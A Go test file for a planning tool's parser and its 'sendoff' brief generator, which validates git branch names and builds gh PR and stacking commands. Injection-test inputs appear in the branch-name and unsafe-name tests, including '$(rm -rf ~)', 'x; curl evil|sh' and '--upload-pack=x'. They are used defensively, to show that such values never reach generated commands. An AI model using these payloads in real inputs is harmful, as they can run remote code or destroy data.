package plan

import (
	"fmt"
	"strings"
	"testing"
)

func TestStackFields(t *testing.T) {
	p := mustParse(t, `{"base": " dev ", "tasks": [{"id": "a", "branch": " feature/a "}]}`)
	if p.Base != "dev" || p.Tasks[0].Branch != "feature/a" || !p.Stacked() || len(p.Problems) != 0 {
		t.Fatalf("%+v %s", p, problems(p))
	}
	p = mustParse(t, `{"base": ["a", "b"], "tasks": [{"id": "a", "branch": 3}]}`)
	if !strings.Contains(problems(p), "plan: base is not a plain branch name") || !strings.Contains(problems(p), "a: branch is not text") || p.ReadOnly != "" {
		t.Fatal(problems(p))
	}
	if p := mustParse(t, `{"tasks": [{"id": "a", "depends_on": ["b"]}, {"id": "b"}]}`); p.Stacked() || len(p.Problems) != 0 {
		t.Fatalf("a plan without base or branch is not a stack and gains no problems: %s", problems(p))
	}
	if string(Stub("auth")) != strings.Replace(string(Stub("auth")), `"base"`, "", 1) {
		t.Fatal("the stub has no base")
	}
}

func TestPlainRef(t *testing.T) {
	for _, s := range []string{"dev", "main", "feature/task_completion", "fix/key-input.v2", "release/1.2", strings.Repeat("x", 80)} {
		if !plainRef(s) {
			t.Errorf("%q is plain", s)
		}
	}
	for _, s := range []string{"", "-x", "--upload-pack=x", "/x", "x/", ".x", "x.", "a..b", "a//b", "a/.b", "x.lock", "a.lock/b", "HEAD", "a b", "a;b", "$(rm -rf ~)", "a`b`", "ü", "a\x1b[2J", "a@{u}", strings.Repeat("x", 81)} {
		if plainRef(s) {
			t.Errorf("%q is not plain", s)
		}
	}
}

func TestStackProblems(t *testing.T) {
	cases := []struct{ name, src, want string }{
		{"bad branch", `{"base": "dev", "tasks": [{"id": "a", "branch": "a b"}]}`, "a: branch is not a plain branch name"},
		{"branch is base", `{"base": "dev", "tasks": [{"id": "a", "branch": "dev"}]}`, `a: branch "dev" is the plan's base`},
		{"shared branch", `{"base": "dev", "tasks": [{"id": "a", "branch": "x"}, {"id": "b", "branch": "x"}]}`, `b: branch "x" is also a's`},
		{"branch on a parent", `{"base": "dev", "tasks": [{"id": "ui", "branch": "x"}, {"id": "a", "parent": "ui"}]}`, "ui: has tasks under it, so its branch is ignored"},
		{"later dep", `{"base": "dev", "tasks": [{"id": "a", "depends_on": ["b"]}, {"id": "b"}]}`, `a: depends on "b", which comes later in the file`},
		{"later dep via parent", `{"base": "dev", "tasks": [{"id": "ui"}, {"id": "card", "parent": "ui"}, {"id": "x", "depends_on": ["ui"]}, {"id": "late", "parent": "ui"}]}`, `x: depends on "ui", whose task "late" comes later in the file`},
	}
	for _, c := range cases {
		p := mustParse(t, c.src)
		if !strings.Contains(problems(p), c.want) || p.ReadOnly != "" {
			t.Errorf("%s: want %q in\n%s", c.name, c.want, problems(p))
		}
	}
	for _, src := range []string{
		`{"base": "dev", "tasks": [{"id": "ui"}, {"id": "a", "parent": "ui", "depends_on": ["ui"]}]}`,    // its own parent
		`{"base": "dev", "tasks": [{"id": "a", "depends_on": ["b"]}, {"id": "b", "status": "skipped"}]}`, // no PR, no code
		`{"base": "dev", "tasks": [{"id": "a", "depends_on": ["b"]}, {"id": "b", "depends_on": ["a"]}]}`, // a loop, reported as one
	} {
		if got := problems(mustParse(t, src)); strings.Contains(got, "later in the file") {
			t.Errorf("%s:\n%s", src, got)
		}
	}
}

func TestStackBelowAndAbove(t *testing.T) {
	p := mustParse(t, `{"base": "dev", "tasks": [
		{"id": "a", "status": "done"}, {"id": "h"}, {"id": "h1", "parent": "h", "status": "done"},
		{"id": "b", "status": "skipped"}, {"id": "c", "status": "blocked"}, {"id": "d", "status": "active"},
		{"id": "e", "status": "done"}, {"id": "f"}, {"id": "e", "status": "done"}, {"status": "done"}]}`)
	g := p.Graph()
	ids := func(ts []*Task) string {
		var out []string
		for _, t := range ts {
			out = append(out, t.ID)
		}
		return strings.Join(out, ",")
	}
	if base, open := g.below(g.Task("d")); base != g.Task("h1") || ids(open) != "c" {
		t.Fatalf("d: %v %s", base, ids(open))
	}
	if base, open := g.below(g.Task("a")); base != nil || open != nil {
		t.Fatal("a is the bottom")
	}
	if got := ids(g.above(g.Task("d"))); got != "e" {
		t.Fatal(got)
	}
	if got := ids(g.above(g.Task("a"))); got != "h1,e" {
		t.Fatal(got)
	}
}

func TestSendoffStack(t *testing.T) {
	plan := func(a, b, c string) *Plan {
		return mustParse(t, fmt.Sprintf(`{"id": "demo", "base": "dev", "tasks": [
			{"id": "plans-ui", "status": %q, "branch": "feature/plans_ui"},
			{"id": "card-highlight", "status": %q, "depends_on": ["plans-ui"], "branch": "feature/card_highlight"},
			{"id": "load-outline", "status": %q, "branch": "feature/load_outline"}]}`, a, b, c))
	}
	cases := []struct {
		name string
		p    *Plan
		want []string
		not  []string
	}{
		{"on the PR below", plan("done", "active", "pending"), []string{
			"Stack: each leaf task is one PR, stacked in plan file order on dev.\n- Branch: feature/card_highlight\n- Base: feature/plans_ui (plans-ui, done) · once its PR has merged, use dev\n",
			"gh pr create --base feature/plans_ui --head feature/card_highlight",
			"gh stack link --base dev feature/plans_ui feature/card_highlight, leaving out any whose PR merged",
			"if it isn't on the base yet, rebase it onto the base and retarget its PR",
			"(copy it out of the repo, git checkout -- rex/plans/demo.rex.json, switch, copy it back)",
		}, []string{"Below it", "PRs above it"}},
		// third up: --base names the bottom's base, so the whole done chain is listed
		{"third in the stack", plan("done", "done", "active"), []string{"- Base: feature/card_highlight (card-highlight, done)", "gh stack link --base dev feature/plans_ui feature/card_highlight feature/load_outline,"}, []string{"gh stack link --base dev feature/card_highlight feature/load_outline"}},
		{"bottom", plan("pending", "pending", "pending"), []string{"- Base: dev (the bottom of the stack)\n", "gh pr create --base dev --head feature/plans_ui"}, []string{"gh stack link", "the PR it sits on"}},
		{"fix a lower PR", plan("active", "done", "done"), []string{"PRs above it, already done: feature/card_highlight, feature/load_outline.", "git rebase --autostash --update-refs feature/plans_ui", "retarget the PR of feature/card_highlight to feature/plans_ui"}, nil},
		{"out of order", plan("done", "blocked", "active"), []string{"- Below it, not done yet: card-highlight (blocked).", "gh pr create --base feature/plans_ui --head feature/load_outline"}, nil},
	}
	for _, c := range cases {
		got, _ := Sendoff(c.p, "rex/plans/demo.rex.json")
		for _, w := range c.want {
			if !strings.Contains(got, w) {
				t.Errorf("%s: missing %q\n%s", c.name, w, got)
			}
		}
		for _, w := range c.not {
			if strings.Contains(got, w) {
				t.Errorf("%s: has %q\n%s", c.name, w, got)
			}
		}
		if strings.Count(got, "rex-sendoff:") != 1 || !strings.HasSuffix(got, "rex-sendoff: rex/plans/demo.rex.json#"+c.p.Graph().Pin().ID+"\n") {
			t.Errorf("%s: one fingerprint, last", c.name)
		}
	}
	if got, _ := Sendoff(plan("done", "done", "done"), "p.rex.json"); strings.Contains(got, "Stack:") {
		t.Fatal("no pin, no Stack part")
	}
}

func TestSendoffStackNeverPutsUnsafeNamesInCommands(t *testing.T) {
	got, _ := Sendoff(mustParse(t, `{"id": "x;y", "base": "$(id)", "tasks": [
		{"id": "a", "status": "done", "branch": "x; curl evil|sh"},
		{"id": "b", "status": "active", "branch": "--upload-pack=x"}]}`), "p.rex.json")
	for _, bad := range []string{"$(id)", "curl", "upload-pack", "x;y"} {
		if strings.Contains(got[strings.Index(got, "\nStack: "):], bad) {
			t.Fatalf("%q reached the brief:\n%s", bad, got)
		}
	}
	for _, want := range []string{"on the trunk (", `this task's "branch" can't be used (not a plain branch name)`, `the branch of a (done; its "branch" in the plan can't be used: not a plain branch name)`, "gh pr create --base <base> --head <branch>", "gh stack link --base <trunk> <the stack's branches, bottom first> <branch>"} {
		if !strings.Contains(got, want) {
			t.Fatalf("missing %q\n%s", want, got)
		}
	}
}

func TestSendoffNeverNamesABranchRexFlagged(t *testing.T) {
	for name, tasks := range map[string]string{
		"the base": `{"id": "a", "status": "active", "branch": "dev"}`,
		"shared":   `{"id": "a", "status": "done", "branch": "x"}, {"id": "b", "status": "active", "branch": "x"}`,
		"nested":   `{"id": "a", "status": "done", "branch": "feature/x"}, {"id": "b", "status": "active", "branch": "feature/x/part2"}`,
	} {
		p := mustParse(t, `{"base": "dev", "tasks": [`+tasks+`]}`)
		got, _ := Sendoff(p, "p.rex.json")
		stack := got[strings.Index(got, "\nStack: "):]
		if len(p.Problems) == 0 || !strings.Contains(stack, `"branch" can't be used`) || strings.Contains(stack, "--head dev") || strings.Contains(stack, "--head x") || strings.Contains(stack, "--head feature/x/part2") {
			t.Errorf("%s: %s\n%s", name, problems(p), stack)
		}
	}
	if p := mustParse(t, `{"base": "feature/auth", "tasks": [{"id": "a", "branch": "feature/auth/login"}]}`); len(p.Problems) != 1 || !strings.Contains(p.Problems[0].Msg, "can't both exist in git") {
		t.Fatalf("a branch under the base is a Problem: %s", problems(p))
	}
}

func TestAReopenedPinFindsItsOwnBranch(t *testing.T) {
	got, _ := Sendoff(mustParse(t, `{"id": "demo", "base": "dev", "tasks": [
		{"id": "a", "status": "active", "accomplished": ["the first try"]},
		{"id": "b", "status": "done", "branch": "feature/b"}]}`), "p.rex.json")
	if !strings.Contains(got, "none in the plan, but this task had a PR · find it") || strings.Contains(got, "(else demo/a)") {
		t.Fatalf("a task that had a PR keeps its branch:\n%s", got)
	}
}

func TestSendoffKeepsTheStackWhenTrimmed(t *testing.T) {
	long := strings.Repeat("a long sentence about the work ", 30)
	tasks := []string{fmt.Sprintf(`{"id": "%s", "status": "active", "branch": "%s", "does": [%q]}`, strings.Repeat("p", 70), strings.Repeat("b", 80), long)}
	for i := 0; i < 200; i++ {
		tasks = append(tasks, fmt.Sprintf(`{"id": "t%03d%s", "status": "done", "branch": "%s%03d", "does": [%q], "accomplished": [%q], "completed_notes": %q}`, i, strings.Repeat("i", 70), strings.Repeat("u", 77), i, long, long, long))
	}
	got, _ := Sendoff(mustParse(t, `{"title": "big", "base": "`+strings.Repeat("d", 80)+`", "goal": "`+long+`", "tasks": [`+strings.Join(tasks, ",")+`]}`), "big.rex.json")
	if len(got) > sendoffCap || !strings.HasSuffix(got, "rex-sendoff: big.rex.json#"+strings.Repeat("p", 70)+"\n") || !strings.Contains(got, "\nStack: ") || !strings.Contains(got, "--update-refs") || !strings.Contains(got, "(see plan file)") {
		t.Fatalf("%d bytes:\n%s", len(got), got[max(0, len(got)-2500):])
	}
	if i := strings.Index(got, "\nFor the next chat\n"); len(got)-i > 2600 {
		t.Fatalf("footer %d bytes", len(got)-i)
	}
}
